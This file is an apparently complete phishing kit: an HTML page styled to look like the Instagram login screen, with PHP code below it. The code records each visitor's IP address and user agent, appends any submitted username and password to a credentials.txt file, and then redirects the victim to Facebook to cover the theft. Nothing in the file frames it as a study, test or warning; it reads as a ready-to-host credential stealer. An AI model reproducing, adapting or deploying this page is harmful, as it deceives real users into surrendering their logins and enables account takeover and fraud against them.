<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
<style>
	body {
		font-family: 'Arial', sans-serif;
		background-color: #fafafa;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
		margin: 0;
	}

	.login-container {
		background-color: #fff;
		border: 1px solid #dbdbdb;
		border-radius: 4px;
		padding: 20px;
		width: 300px;
		box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
		text-align: center;
	}

	.login-container h2 {
		margin-bottom: 20px;
		font-size: 24px;
	}

	.login-form input {
		width: 100%;
		padding: 10px;
		margin: 8px 0;
		border: 1px solid #dbdbdb;
		border-radius: 4px;
	}

	.login-form button {
		width: 100%;
		padding: 10px;
		background-color: #3897f0;
		color: #fff;
		border: none;
		border-radius: 4px;
		font-weight: bold;
		cursor: pointer;
	}
</style>
</head>
<body>

<div class="login-container">
    <form class="login-form" action="" method="post">
        <img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
        <h2>Log in to Instagram</h2>
        <input type="text" name="username" placeholder="Username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
        <div class="signup-link"> Don't have an account? <a href="http://instagram.com">Sign Up</a></div>
    </form>
</div>

</body>
</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
  $ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "\n|-------------------INSTAGRAM-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
file_put_contents($filename, $data, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);
    header("Location: https://www.facebook.com");
}
?>
